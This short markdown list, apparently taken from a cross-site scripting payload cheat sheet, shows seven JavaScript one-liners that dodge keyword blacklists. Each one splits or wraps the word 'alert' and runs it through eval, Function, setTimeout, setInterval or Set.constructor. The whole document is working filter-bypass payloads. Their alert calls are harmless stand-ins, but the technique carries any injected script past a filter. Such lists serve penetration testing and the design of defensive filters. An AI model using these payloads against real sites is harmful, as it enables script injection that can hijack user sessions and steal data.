# Bypass word blacklist with code evaluation

- `eval('ale'+'rt(0)');`
- `Function('ale'+'rt(1)')();`
- `new Function\`alert\`6\`\``;
- `setTimeout('ale'+'rt(2)');`
- `setInterval('ale'+'rt(10)');`
- `Set.constructor('ale'+'rt(13)')();`
- `Set.constructor\`alert(14)\`\`\``;